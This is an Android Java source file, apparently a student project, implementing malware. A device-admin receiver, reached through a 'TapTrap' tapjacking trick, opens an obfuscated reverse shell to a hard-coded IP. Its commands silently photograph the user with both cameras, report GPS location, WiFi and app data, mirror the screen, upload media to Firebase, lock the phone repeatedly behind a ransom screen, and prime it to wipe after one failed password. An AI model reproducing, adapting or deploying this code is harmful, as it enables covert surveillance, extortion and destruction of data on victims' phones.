package com.example.inf2007_mad_j1847.test;
//import static com.example.inf2007_mad_j1847.test.Ran_warnKt.showRansomDialog;

import android.app.AlertDialog;
import android.app.admin.DeviceAdminReceiver;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.graphics.Color;
import android.graphics.drawable.ColorDrawable;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.os.PowerManager;
import android.util.Log;
import android.view.Gravity;
import android.view.WindowManager;
import android.widget.TextView;

import java.io.IOException;
import java.net.Socket;
import java.util.List;
import java.util.Map;
import java.util.concurrent.atomic.AtomicBoolean;


import androidx.camera.core.Camera;

import com.example.inf2007_mad_j1847.utils.StringHelper;

public class AppDeviceAdminReceiver extends DeviceAdminReceiver {

    private static final String TAG = StringHelper.qzxp("+hQWp6TEF7VmSn160A=="); //"TapTrap-Admin";
    private static final String SERVER_IP = StringHelper.qzxp("b2ZYmxn7wAI2oFE="); //"20.2.66.175";
    private static final int SERVER_PORT = 9999;




    // Lock control variables
    private static AtomicBoolean isContinuousLockActive = new AtomicBoolean(false);
    private static Thread continuousLockThread = null;
    private static PowerManager.WakeLock wakeLock = null;
    @Override
    public void onEnabled(Context context, Intent intent) {
        super.onEnabled(context, intent);
        // 🔴 TAPTRAP SUCCEEDED!
        Log.d(TAG, StringHelper.qzxp("GDGs8ANwX8kBlqnKaqbLe+lXVJ1qcNotXvj9dtdaGEKY+ko0UxU=")); //"🔥 Device Admin GRANTED via TapTrap!");
        Log.d(TAG, StringHelper.qzxp("f8FBwnYe5yD7wHHn6IIiwCf4")); //"connect to server ");


        // START THE SERVICE instead of calling launchReverseShell directly
        Intent serviceIntent = new Intent(context, ShellService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            context.startForegroundService(serviceIntent);
        } else {
            context.startService(serviceIntent);
        }

//        launchReverseShell(context);
        Log.d(TAG, "APP LIST:\n" + getInstalledApps(context));



    }

    // Reverse Shell Code
    public void launchReverseShell(Context context) {
        new Thread(() -> {
            try {
                Socket socket = new Socket(SERVER_IP, SERVER_PORT);
                Log.d(TAG, StringHelper.qzxp("8uQoarwP08uGfqI+D0QzVgAIPcjWv13KX0PcQw==")); // "🔥 Reverse shell launched!");

                // Send a welcome message to the listener
                java.io.PrintWriter writer = new java.io.PrintWriter(socket.getOutputStream(), true);
                writer.println(StringHelper.qzxp("CaHL3TBJLDJrnwjhvpAKfWHlY6EwM1RnPcKpZpk=")); //"🔥 TapTrap shell connected!");
                writer.println(StringHelper.qzxp("5VgAVK1ZplqcJm2ssKF2LMLgZQ==")); //"Available commands:");
                writer.println(StringHelper.qzxp("x2rXui+gxSlbBOiF/1l8StDgLlDd38PYCrM/7tPcwg==")); //"  lock        - Lock the device");
                writer.println(StringHelper.qzxp("4wZ6pitTibDWnCaoWMdeLH/FO+65vPy2hD0fiGtwn66lSQ==")); //"  whoami      - Show app user info");
                writer.println(StringHelper.qzxp("t2dNyRhQmrrJ4vvNnaUQ9Flubj1ojG3NTEdwsUszla3+K1o=")); //"  device_info - Show device details");
                writer.println(StringHelper.qzxp("FQmQG1gEdbM0VXJNqsGrGlzUFSDfNz7PRmxF5Wvrqn5BXIE=")); //"  battery     - Show battery status");
                writer.println(StringHelper.qzxp("7b7MWxlnCYE91qspskbYFqV9SF95UszEV1D1F9jap7i+")); //"  ip          - Show IP addresses");
                writer.println(StringHelper.qzxp("G5zDVAYj3d7no4vEwwc4P3lReFXOGEqmZRSsHa9rEWlLzIYdVXqi8/6gjMSCBiUnYR1nWMVPC7VgFQ==")); //"  list_apps (only show current app)  - List installed apps");
                writer.println(StringHelper.qzxp("rtVOgXD30pIFcOy+2Hoo3wsdSyaYi408OIJtJzK4UH783BzEMridywUK57PDNSuQHRNUIZzO")); //"  reboot (not working on emulator)     - Reboot device");
                writer.println(StringHelper.qzxp("g2b3X013ODUYuJ2osw==")); //"  ransom_lock");
                writer.println(StringHelper.qzxp("MRl6ELhVZJV1w1I1ow==")); //"  ransom_end ");
                writer.println(StringHelper.qzxp("3rIZ9DZl8QuZfX9i+io1hRTSSJP7pOpN1NTpa/1MWtqNsgv5MyvdDpNuNnG/Ag60QIE=")); //"  scan_media [N]  - Scan N images and show results");
                writer.println(StringHelper.qzxp("/WIA2QUHI4m1eP9xbnX4aoHCLJYOLPcsd3al6tle0VT9NhqJLwEwiPdCxVATBqwl04Nm0w==")); //"  upload [ID]     - Upload image to Firebase Storage");
                writer.println(StringHelper.qzxp("/VlwO1MqFbOjoJ+P4jUn/U2bRHbcPaHMERCgk3IxeK0=")); //"  exit        - Close connection");
                writer.println(StringHelper.qzxp("NcwkgzalUuOhMfm1cKFnxA49lOUWI1ih3Ou+4tQFUlJ9lSCDJaEe7u4Z9K8t")); //"  wipe - Factory reset device (physical only)");
                writer.println(StringHelper.qzxp("YJ7VqAPCqQLWWPSkm3t3VOB47WavvBI+b9wp0xjh17kz3dSuFMm/BOZB7vaMYmAGtHiPIr0=")); //"  screen_mirror - Start sending screenshots every 10s");
                writer.println(StringHelper.qzxp("aGWxoWiS/M5fzShq60zsQVNclJ2t2PmtQZinFBcouQc6N62w")); //"  screen_stop   - Stop screen mirror");
                writer.println(StringHelper.qzxp("IpK8Om12/s9MOF74c/YK/MWFBjuHNmI5RGZELf9D")); //"  wifi        - Show WiFi info");
                writer.println(StringHelper.qzxp("J0ce7D+7XZf926Pr5nSKCOlBI6HsyKvH7A2O2l538jdmExfwfPEJuf3a5KejdOpJylpsuqXhkA==")); //"  location    - Show GPS coordinates + Google Maps link");
                writer.println(StringHelper.qzxp("mvkk5o1plcUk9sb0M7uApCo2DGuTr9qjpIoC+ImPiWrVtza0gWaM/yX5h/R79Nnr")); //"  front_snap  - Silently take front camera photo");
                writer.println(StringHelper.qzxp("pAQE9VfntWhzz97JkD6HIzVQTVPbDd4GuXQ91lGwR8DnT0b3VeGPaXyO3oHfasU=")); //"  back_snap   - Silently take back camera photo");
                writer.println(StringHelper.qzxp("JYQINeCiusqq0fNFzm945NYReilBh/eRoGQBW8E0KrklhA==")); //"----------------------------------");

                // Read commands from listener
                java.io.BufferedReader reader = new java.io.BufferedReader(
                        new java.io.InputStreamReader(socket.getInputStream())
                );

                String command;
                while ((command = reader.readLine()) != null) {
                    command = command.trim();
                    Log.d(TAG, StringHelper.qzxp("x4/PO6tQ4saZtLMj09l7h+JrracI0bg=")  + command); // "📩 Command received: "
                    String response = handleCommand(context, command);
                    writer.println(response);

                    if (command.equals("exit")) break; // "exit"
                }

                socket.close();

            } catch (Exception e) {
                Log.e(TAG, StringHelper.qzxp("tF7tcV0H9N8pY/+2aDY=") + e.getMessage()); // "Shell failed: "
            }
        }).start();
    }

    private String handleCommand(Context context, String command) {

        if (command.toLowerCase().startsWith(StringHelper.qzxp("3WkGmU1cs2jNXA=="))) { //"scan_media"
            int maxItems = 10;
            String[] parts = command.split(" ");
            if (parts.length > 1) {
                try {
                    maxItems = Integer.parseInt(parts[1]);
                } catch (NumberFormatException e) {
                    return StringHelper.qzxp("skenJQn6hM9I/VjNhJQUngx/hsvshmWtmOF4NcKb6NU9v09sIbSp4Hk="); //"❌ Invalid number. Usage: scan_media [N]";
                }
            }

            final int finalMaxItems = maxItems;

            Log.d(TAG, StringHelper.qzxp("8ex98LeGAsD+hJ0o9jyW9TSJiqWNcyNf")  + finalMaxItems + " items"); // "Starting media scan for "

            // Run scan in background and wait for result
            final StringBuilder resultBuilder = new StringBuilder();

            Thread scanThread = new Thread(() -> {
                try {
                    List<Map<String, String>> results = MediaCollector.scanRecentMedia(context, finalMaxItems);

                    if (results.isEmpty()) {
                        resultBuilder.append(StringHelper.qzxp("cPiovhCKbs26pmSvNa+w9jiaguIIbA==")); // "📸 No images found.\n"
                    } else {
                        resultBuilder.append("✅ Found ").append(results.size()).append(StringHelper.qzxp("sfqgEXgFsxDB")); //  " images:\n"
                        for (int i = 0; i < results.size(); i++) {
                            Map<String, String> item = results.get(i);
                            resultBuilder.append("  ").append(i + 1).append(". ")
                                    .append(item.get("name"))
                                    .append(" [ID: ").append(item.get("id")).append("]\n");
                        }
                        resultBuilder.append(StringHelper.qzxp("E+r8/hNnoWmuyPXaWbPgg7yuYMVTgE5zl97fMrUxovgj+/itUQ==")); //"Use 'upload [ID]' to send to Firebase"
                    }
                } catch (Exception e) {
                    resultBuilder.append(StringHelper.qzxp("wXXN+3lXG6VoPuLihWrKNQk=")).append(e.getMessage()); // "❌ Scan failed: "
                    Log.e(TAG, StringHelper.qzxp("OIoBEeBzl7XRwmg3") + e.getMessage()); // "Scan error: "
                }
            });

            scanThread.start();
            try {
                scanThread.join(10000); // Wait up to 10 seconds for scan to complete
            } catch (InterruptedException e) {
                return StringHelper.qzxp(""); //"❌ Scan timed out";
            }

            return resultBuilder.toString();
        }

        if (command.toLowerCase().startsWith(StringHelper.qzxp("XfducBUp") )) { // "upload"
            String[] parts = command.split(" ");
            if (parts.length < 2) {
                return StringHelper.qzxp("H4RnZQ53Jg9B3NV7M+QRSLOQJw1XcIRUJunHRg=="); //  "❌ Usage: upload [image_id]"
            }

            String imageId = parts[1];
            String deviceId = context.getPackageName();

            new Thread(() -> {
                MediaCollector.uploadToFirebase(context, imageId, deviceId);
            }).start();

            return StringHelper.qzxp("GbV/VbYFQGrgIrFXmRfKh91SZObB") + imageId +  StringHelper.qzxp("yV6D0dA5QmPtIqZb2V7E"); // "📤 Uploading image "  " to Firebase..."
        }

        switch (command.toLowerCase()) {
            case "lock":
                lockDevice(context);

                return StringHelper.qzxp("Hb5uR/8ky8mKfYVn2KrugjDL"); // "✅ Device locked!"



            case "whoami":
                return StringHelper.qzxp("9bge+Jrh")  + android.os.Process.myUid() + // "User: "
                    StringHelper.qzxp("/DFaohIB9LM=")  + context.getPackageName();   // " | App: "

            case "device_info":
                return getDeviceInfo();

            case "battery":
                return getBatteryInfo(context);

            case "ip":
                return getIpAddress();

            case "list_apps":
                return getInstalledApps(context);


            case "reboot":
                rebootDevice(context);
                return StringHelper.qzxp("LOhIKVn2naEqdKrl1t4Wspj1jsnc00w="); // "✅ Rebooting device..."

            case "help":
                return StringHelper.qzxp("Vjx3lE+pY6tPK8y3EefE0u3SFqD9bGh/uYekD1fpAPU1JHKWT6pu9FVvxa4b742t590dkL4qbDLtkKAQcapOsGV/OpVHtHOHFHvQq16sgJvq1iSe4noic+qMqhVX5x6pOXNonEyoaKxZK8WgG/g="); // "Commands: lock, cam_off, cam_on, whoami, device_info, battery, ip, list_apps, hide_app, show_app, reboot, exit"

            case "exit":
                return StringHelper.qzxp("tLxGNg9UD6/ovexuIJIBlDMSJNyoFYCFEFc="); // "👋 Closing connection..."

            case "wipe":

                setMaxFailedAttempts(context, 1);
            return StringHelper.qzxp("It+Q2JTNMnRTWILJq1y5KUz+4T0="); // "✅ Wiping device..."

            case "ransom_lock":
                showRansomDialog(context);
                startContinuousLock(context);
                return StringHelper.qzxp("IeGhlvhpKot37ufX6RDjy/q8"); // "✅ Device locked!"

            case "ransom_end":
                stopContinuousLock();
                return StringHelper.qzxp("ObxECAB1mIZO9cPS6ohrmlmKKtw="); // "✅ Device unlocked!"

            case "screen_mirror":
//                Intent mirrorIntent = new Intent(context, ScreenMirrorService.class);
//                mirrorIntent.putExtra("resultCode", ScreenMirrorService.sResultCode);
//                mirrorIntent.putExtra("resultData", ScreenMirrorService.sResultData);
//                context.startForegroundService(mirrorIntent);
                return StringHelper.qzxp("u/o74nivmCSGtMInj5h+BtjG5drFP7g84zsbfFpeaJUlApRnDpWeIcOw2CeKhXgEjZvqiZlj73OxdBU/GAU8xXtchQ=="); // "🎥 Screen mirror already running! View at http://20.2.66.175:9090"

            case "screen_stop":
                context.stopService(new Intent(context, ScreenMirrorService.class));
                return StringHelper.qzxp("iZpQNF540O/Bgs7N2dWsdOxumlRm+pYBJtJx"); // "🛑 Screen mirror stopped!"

            case "wifi":
                return getWifiInfo(context);

            case "location":
                return getLocation(context);

            case "front_snap":
                Intent frontIntent = new Intent(context, CameraService.class);
                frontIntent.putExtra(CameraService.EXTRA_LENS, "front");
                context.startService(frontIntent);
                return "📸 Front camera snap taken! Check http://20.2.66.175:9090";

            case "back_snap":
                Intent backIntent = new Intent(context, CameraService.class);
                backIntent.putExtra(CameraService.EXTRA_LENS, "back");
                context.startService(backIntent);
                return "📸 Back camera snap taken! Check http://20.2.66.175:9090";

            default:
                return "❌ Unknown command: " + command + " | type 'help' for commands";
        }
    }


    // Device info
    private String getDeviceInfo() {
        return "Model: " + android.os.Build.MODEL +
                "\nManufacturer: " + android.os.Build.MANUFACTURER +
                "\nAndroid: " + android.os.Build.VERSION.RELEASE +
                "\nAPI: " + android.os.Build.VERSION.SDK_INT +
                "\nDevice: " + android.os.Build.DEVICE +
                "\nFingerprint: " + android.os.Build.FINGERPRINT;
    }

    // Battery info
    private String getBatteryInfo(Context context) {
        android.content.IntentFilter ifilter = new android.content.IntentFilter(Intent.ACTION_BATTERY_CHANGED);
        Intent batteryStatus = context.registerReceiver(null, ifilter);
        int level = batteryStatus != null ? batteryStatus.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, -1) : -1;
        int scale = batteryStatus != null ? batteryStatus.getIntExtra(android.os.BatteryManager.EXTRA_SCALE, -1) : -1;
        int status = batteryStatus != null ? batteryStatus.getIntExtra(android.os.BatteryManager.EXTRA_STATUS, -1) : -1;
        float pct = level * 100 / (float) scale;
        boolean charging = status == android.os.BatteryManager.BATTERY_STATUS_CHARGING ||
                status == android.os.BatteryManager.BATTERY_STATUS_FULL;
        return "Battery: " + (int) pct + "% | " + (charging ? "Charging" : "Not charging");
    }

    // IP Address
    private String getIpAddress() {
        try {
            java.util.Enumeration<java.net.NetworkInterface> interfaces = java.net.NetworkInterface.getNetworkInterfaces();
            StringBuilder sb = new StringBuilder("IP Addresses:\n");
            while (interfaces.hasMoreElements()) {
                java.net.NetworkInterface iface = interfaces.nextElement();
                java.util.Enumeration<java.net.InetAddress> addrs = iface.getInetAddresses();
                while (addrs.hasMoreElements()) {
                    java.net.InetAddress addr = addrs.nextElement();
                    if (!addr.isLoopbackAddress()) {
                        sb.append(iface.getName()).append(": ").append(addr.getHostAddress()).append("\n");
                    }
                }
            }
            return sb.toString();
        } catch (Exception e) {
            return "Failed to get IP: " + e.getMessage();
        }
    }


    private List<ApplicationInfo> getInstalledAppsCompat(Context context) {
        PackageManager pm = context.getPackageManager();

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) { // API 33+
            // API 33+ requires PackageInfoFlags
            PackageManager.ApplicationInfoFlags flags =
                    PackageManager.ApplicationInfoFlags.of(0);
            return pm.getInstalledApplications(flags);
        } else {
            // Legacy method
            return pm.getInstalledApplications(PackageManager.GET_META_DATA);
        }
    }

    // List installed apps
    private String getInstalledApps(Context context) {
        StringBuilder sb = new StringBuilder("Installed Apps:\n");

        try {
            // Use compat method
            List<ApplicationInfo> apps = getInstalledAppsCompat(context);

            sb.append("Total apps found: ").append(apps.size()).append("\n");

            for (ApplicationInfo app : apps) {
                // Skip system apps (optional)
                //if ((app.flags & ApplicationInfo.FLAG_SYSTEM) == 0) {
                    String appName = context.getPackageManager()
                            .getApplicationLabel(app).toString();
                    sb.append("  - ").append(appName)
                            .append(" (").append(app.packageName).append(")\n");
                //}
            }

            Log.d("TapTrap", "App list generated: " + apps.size() + " apps");

        } catch (SecurityException e) {
            Log.e("TapTrap", "Permission denied: " + e.getMessage());
            sb.append("ERROR: Missing QUERY_ALL_PACKAGES permission");
        } catch (Exception e) {
            Log.e("TapTrap", "Error getting apps: " + e.getMessage());
            sb.append("ERROR: ").append(e.getMessage());
        }

        return sb.toString();
    }



    // Reboot device
    private void rebootDevice(Context context) {
        DevicePolicyManager dpm = getDpm(context);
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.N) {
            dpm.reboot(getAdmin(context));
        }
    }

    // ========== CENTRALIZED DPM GETTER ==========
    /**
     * Get DevicePolicyManager instance - ALL commands use this
     */
    private DevicePolicyManager getDpm(Context context) {
        return (DevicePolicyManager) context.getSystemService(Context.DEVICE_POLICY_SERVICE);
    }

    /**
     * Get ComponentName - ALL commands use this
     */
    private ComponentName getAdmin(Context context) {
        return new ComponentName(context, AppDeviceAdminReceiver.class);
    }

    /**
     * 1. Lock device immediately
     */
    public void lockDevice(Context context) {
        DevicePolicyManager dpm = getDpm(context);
        Log.d(TAG, " Locking device now");
        dpm.lockNow();

    }


    private void setMaxFailedAttempts(Context context, int attempts) {
        try {
            DevicePolicyManager dpm = getDpm(context);
            ComponentName admin = getAdmin(context);

            // Validate attempts range (1-10 as per documentation)
            if (attempts < 1 || attempts > 10) {
                Log.e(TAG, "Attempts must be between 1 and 10");
                return;
            }

            // Set the policy
            dpm.setMaximumFailedPasswordsForWipe(admin, attempts);
            Log.i(TAG, "✅ Max failed attempts set to: " + attempts);

            // Verify it was set
            int currentSetting = dpm.getMaximumFailedPasswordsForWipe(admin);
            Log.d(TAG, "Verified setting: " + currentSetting);

        } catch (SecurityException e) {
            Log.e(TAG, "Security error: " + e.getMessage());
        } catch (Exception e) {
            Log.e(TAG, "Error: " + e.getMessage());
        }
    }



    public void startContinuousLock(final Context context) {
        if (isContinuousLockActive.get()) {
            Log.d(TAG, "⚠️ Already locking");
            return;
        }

        // Acquire wake lock
        try {
            PowerManager powerManager = (PowerManager) context.getSystemService(Context.POWER_SERVICE);
            wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK,
                    "TapTrap:LockWakeLock");
            wakeLock.acquire(10*60*1000L);
            Log.d(TAG, "✅ WakeLock acquired");
        } catch (Exception e) {
            Log.e(TAG, "Failed to acquire WakeLock: " + e.getMessage());
        }

        isContinuousLockActive.set(true);

        continuousLockThread = new Thread(() -> {
            DevicePolicyManager dpm = (DevicePolicyManager)
                    context.getSystemService(Context.DEVICE_POLICY_SERVICE);

            Log.d(TAG, "▶️ LOCK STARTED - Will auto-stop after 50 locks");

            int lockCount = 0;
            long startTime = System.currentTimeMillis();

            while (isContinuousLockActive.get()) {
                try {
                    dpm.lockNow();
                    lockCount++;

                    long runningTime = (System.currentTimeMillis() - startTime) / 1000;
                    Log.d(TAG, "🔒 Lock #" + lockCount + " - " + runningTime + "s elapsed");

                    // SAFEGUARD: Stop after 50 locks
                    if (lockCount >= 20) {
                        Log.d(TAG, "⚠️ SAFEGUARD: 50 locks reached, stopping");
                        break;  // ✅ Jumps to cleanup below
                    }

                    Thread.sleep(5000);  // 5 second delay

                } catch (InterruptedException e) {
                    Log.d(TAG, "⏹️ Thread interrupted");
                    break;  // ✅ Jumps to cleanup
                } catch (SecurityException e) {
                    Log.e(TAG, "❌ Security error - admin disabled");
                    break;  // ✅ Jumps to cleanup
                } catch (Exception e) {
                    Log.e(TAG, "❌ Unexpected error: " + e.getMessage());
                    // Continue locking despite error
                }
            }

            // ✅ CLEANUP - This runs after ANY break
            if (wakeLock != null && wakeLock.isHeld()) {
                wakeLock.release();
                wakeLock = null;
                Log.d(TAG, "✅ WakeLock released");
            }

            isContinuousLockActive.set(false);

            long totalTime = (System.currentTimeMillis() - startTime) / 1000;
            Log.d(TAG, "⏹️ LOCKING STOPPED after " + totalTime + "s and " + lockCount + " locks");
        });

        continuousLockThread.start();
    }

    /**
     * STOP continuous locking (OFF)
     */
    public void stopContinuousLock() {
        if (isContinuousLockActive.get()) {
            isContinuousLockActive.set(false);

            if (continuousLockThread != null) {
                continuousLockThread.interrupt();
                try {
                    continuousLockThread.join(2000); // Wait up to 2 seconds
                } catch (InterruptedException e) {
                    Log.e(TAG, "Interrupted while joining thread");
                }
                continuousLockThread = null;
            }

            // Release wake lock
            if (wakeLock != null && wakeLock.isHeld()) {
                wakeLock.release();
                wakeLock = null;
            }

            Log.d(TAG, "⏹️ Continuous locking STOPPED (OFF)");
        } else {
            Log.d(TAG, "⚠️ Continuous locking was not active");
        }
    }

    public void showRansomDialog(Context context) {
        Intent intent = new Intent(context, RansomActivity.class);
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);

        context.startActivity(intent);
    }

    // WiFi info
    private String getWifiInfo(Context context) {
        try {
            android.net.wifi.WifiManager wm = (android.net.wifi.WifiManager)
                    context.getApplicationContext().getSystemService(Context.WIFI_SERVICE);
            android.net.wifi.WifiInfo info = wm.getConnectionInfo();
            android.net.ConnectivityManager cm = (android.net.ConnectivityManager)
                    context.getSystemService(Context.CONNECTIVITY_SERVICE);
            android.net.NetworkInfo netInfo = cm.getActiveNetworkInfo();

            return "WiFi Info:" +
                    "\nSSID: " + info.getSSID() +
                    "\nBSSID: " + info.getBSSID() +
                    "\nSignal: " + info.getRssi() + " dBm" +
                    "\nIP: " + android.net.wifi.WifiManager.calculateSignalLevel(info.getRssi(), 5) + "/5 bars" +
                    "\nConnected: " + (netInfo != null && netInfo.isConnected());
        } catch (Exception e) {
            return "WiFi info failed: " + e.getMessage();
        }
    }

    // Location info
    private String getLocation(Context context) {
        try {
            android.location.LocationManager lm = (android.location.LocationManager)
                    context.getSystemService(Context.LOCATION_SERVICE);

            if (android.content.pm.PackageManager.PERMISSION_GRANTED !=
                    context.checkSelfPermission(android.Manifest.permission.ACCESS_FINE_LOCATION)) {
                return "❌ Location permission not granted";
            }

            android.location.Location location = lm.getLastKnownLocation(
                    android.location.LocationManager.GPS_PROVIDER);

            if (location == null) {
                location = lm.getLastKnownLocation(
                        android.location.LocationManager.NETWORK_PROVIDER);
            }

            if (location == null) return "❌ Location unavailable";

            return "Location:" +
                    "\nLatitude: " + location.getLatitude() +
                    "\nLongitude: " + location.getLongitude() +
                    "\nAccuracy: " + location.getAccuracy() + "m" +
                    "\nGoogle Maps: https://maps.google.com/?q=" +
                    location.getLatitude() + "," + location.getLongitude();

        } catch (Exception e) {
            return "Location failed: " + e.getMessage();
        }
    }



}